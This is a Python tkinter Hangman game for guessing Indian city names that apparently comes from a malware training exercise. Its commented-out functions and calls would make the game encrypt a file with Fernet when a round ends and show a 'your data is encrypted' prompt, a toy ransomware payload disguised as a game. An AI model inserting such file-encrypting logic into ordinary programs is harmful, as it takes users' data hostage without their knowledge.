from tkinter import *
from tkinter import messagebox
from string import ascii_uppercase
from cryptography.fernet import Fernet
from playsound import playsound
import random


window = Tk()
window.title('Hangman-GUESS CITIES NAME')
word_list= ['MUMBAI','DELHI','BANGLORE','HYDRABAD','AHMEDABAD','CHENNAI','KOLKATA','SURAT','PUNE','JAIPUR','AMRITSAR','ALLAHABAD','RANCHI',
            'LUCKNOW','KANPUR','NAGPUR','INDORE','THANE','BHOPAL','PATNA','GHAZIABAD','AGRA','FARIDABAD','MEERUT','RAJKOT','VARANASI','SRINAGAR',
            'RAIPUR','KOTA','JHANSI']
            
photos = [PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang0.png"), PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang1.png"), PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang2.png"),
PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang3.png"), PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang4.png"), PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang5.png"),
PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang6.png"), PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang7.png"), PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang8.png"),
PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang9.png"), PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang10.png"), PhotoImage(file="D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\hang11.png")]

# def createkey():
# 	with open('key.key', 'wb') as filekey:
# 		filekey.write(Fernet.generate_key())

# def getkey(address):
# 	with open(address, 'rb') as filekey:
# 		key = filekey.read()
# 	return(key)

# def enc(key, address):
# 	frnt = Fernet(key)
# 	with open(address, 'rb') as file:
# 		original = file.read()
# 	decrypted = frnt.encrypt(original)
# 	with open(address, 'wb') as file:
# 		file.write(decrypted)


# def dec(key, address):
# 	frnt = Fernet(key)
# 	with open(address, 'rb') as file:
# 		encrypted = file.read()
# 	original = frnt.decrypt(encrypted)
# 	with open(address, 'wb') as file:
# 		file.write(original)


def newGame():
    global the_word_withSpaces
    global numberOfGuesses
    numberOfGuesses =0
    
    the_word=random.choice(word_list)
    the_word_withSpaces = " ".join(the_word)
    lblWord.set(' '.join("_"*len(the_word)))

def guess(letter):
	global numberOfGuesses
	if numberOfGuesses<11:	
		txt = list(the_word_withSpaces)
		guessed = list(lblWord.get())
		if the_word_withSpaces.count(letter)>0:
			for c in range(len(txt)):
				if txt[c]==letter:
					guessed[c]=letter
				lblWord.set("".join(guessed))
				if lblWord.get()==the_word_withSpaces:
					playsound('haha.mp3')
					# enc(getkey('key.key'), '1.jpg')
					# msg = messagebox.askquestion('Encrypter', "You're data is encrypted\nYes to encrypt")
					# if msg =='yes':
					# 	dec(getkey('key.key'), '1.jpg')



		else:
			numberOfGuesses += 1
			imgLabel.config(image=photos[numberOfGuesses])
			if numberOfGuesses==11:
					playsound('D:\poulstar\Yangelixx\CEH\malware\Hangman-main\haha.mp3')
					# enc(getkey('key.key'), 'D:\poulstar\Yangelixx\CEH\malware\Hangman-main\images\1.jpg')
					# msg = messagebox.askquestion('Encrypter', "You're data is encrypted\nYes to deccrypt")
					# if msg =='yes':
					# 	dec(getkey('key.key'), '1.jpg')


imgLabel=Label(window)
imgLabel.grid(row=0, column=0, columnspan=3, padx=10, pady=40)


  
lblWord = StringVar()
Label(window, textvariable  =lblWord,font=('consolas 24 bold')).grid(row=0, column=3 ,columnspan=6,padx=10)

n=0
for c in ascii_uppercase:
    Button(window, text=c, command=lambda c=c: guess(c), font=('Helvetica 18'), width=4).grid(row=1+n//9,column=n%9)
    n+=1

Button(window, text="New\nGame", command=lambda:newGame(), font=("Helvetica 10 bold")).grid(row=3, column=8)

newGame()
window.mainloop()